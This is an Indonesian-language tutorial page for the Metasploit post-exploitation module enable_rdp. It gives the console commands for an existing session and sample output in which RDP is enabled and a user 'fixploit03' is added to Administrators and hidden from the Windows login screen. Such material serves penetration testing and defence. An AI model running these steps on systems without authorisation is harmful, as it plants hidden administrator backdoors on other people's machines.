# enable_rdp

Modul ini mengaktifkan Layanan `Remote Desktop` (`RDP`). Modul ini menyediakan opsi untuk membuat akun dan mengonfigurasinya menjadi anggota grup Local Administrators dan Remote Desktop Users. Modul ini juga dapat meneruskan port `3389/tcp` dari target.

## Penulis
- Carlos Perez carlos_perez@darkoperator.com

## Platform
- `Windows`
  
## Cara Penggunaan di Metasploit

```
use post/windows/manage/enable_rdp
set ENABLE true
set FORWARD false
set LPORT 3389
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	Terminal Services service is already set to auto
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: fixploit03 with Password: fixploit03
[*] 	Adding User: fixploit03 to local group 'Remote Desktop Users'
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: fixploit03 to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20250516221529_default_192.168.1.52_host.windows.cle_571851.txt
[*] Post module execution completed
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/post/windows/manage/enable_rdp/)
